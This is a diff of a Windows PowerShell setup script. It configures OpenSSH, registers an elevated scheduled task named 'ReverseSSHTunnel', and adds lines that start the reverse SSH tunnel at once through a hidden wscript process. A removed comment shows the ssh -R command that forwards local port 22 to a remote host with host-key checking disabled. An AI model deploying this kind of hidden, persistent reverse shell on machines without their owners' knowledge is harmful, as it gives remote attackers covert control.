@@ -149,9 +149,6 @@ Write-Host "[+] sshd_config has been fully configured with secure settings."
 
 # Set correct permissions
 icacls.exe "$env:ProgramData\ssh\administrators_authorized_keys" /inheritance:r /grant ""*S-1-5-32-544:F"" /grant "SYSTEM:F"
-#icacls.exe "$env:USERPROFILE\.ssh\authorized_keys" /inheritance:r /grant "${env:USERNAME}:(F)" /grant "SYSTEM:F"
-#icacls.exe "$keyFile" /grant "${env:USERNAME}:(F)"
-#icacls.exe "$keyFile" /grant "SYSTEM:F"
 
 # Create an accesible version of ssh
 $targetPath = "C:\ProgramData\ssh_portable"
@@ -180,14 +177,6 @@ Invoke-SSHCommand -SSHSession $session -Command "mkdir -p ~/.ssh && echo '$publi
 
 # Close the session
 Remove-SSHSession -SSHSession $session
-
-# Create the batch content with properly escaped quotes
-#$batContent = @"
-#@echo off
-#echo [INFO] Starting reverse SSH tunnel at %date% %time% by %USERNAME% >> "$logFile"
-#timeout /t 10 /nobreak > nul
-#"C:\Windows\System32\OpenSSH\ssh.exe" -o "StrictHostKeyChecking=no" -o "ExitOnForwardFailure=yes" -i "$keyFile" -N -f -R ${receivedPort}:127.0.0.1:22 ${user}@${remote_host} >> "$logFile" 2>&1
-#"@
 
 # Setup powershell as default shell
 New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -PropertyType String -Force
@@ -241,7 +230,6 @@ Set-Content -Path $vbsFilePath -Value $vbsContent -Encoding ASCII
 $taskName = "ReverseSSHTunnel"
 
 # Define the action to run the reverse SSH tunnel batch file
-#$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$batFilePath`""
 $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$batFilePath`""
 
 # Remove the task if it already exists
@@ -264,12 +252,10 @@ Register-ScheduledTask -TaskName $taskName `
     -Settings $settings `
     -RunLevel Highest
 
-
-#Register-ScheduledTask -TaskName $taskName `
-#    -Trigger $trigger `
-#    -Action $action `
-#    -Settings $settings `
-#    -RunLevel Highest `
-#    -User $username
-
 Write-Host "`n[!] Success! SSH reverse tunnel batch file created and scheduled. Path: $batFilePath."
+
+# Trigger the Scheduled Task immediately
+Start-ScheduledTask -TaskName $taskName
+Start-Process "wscript.exe" -ArgumentList "`"$vbsFilePath`"" -WindowStyle Hidden
+
+Write-Host "[+] Reverse tunnel initiated in the background."
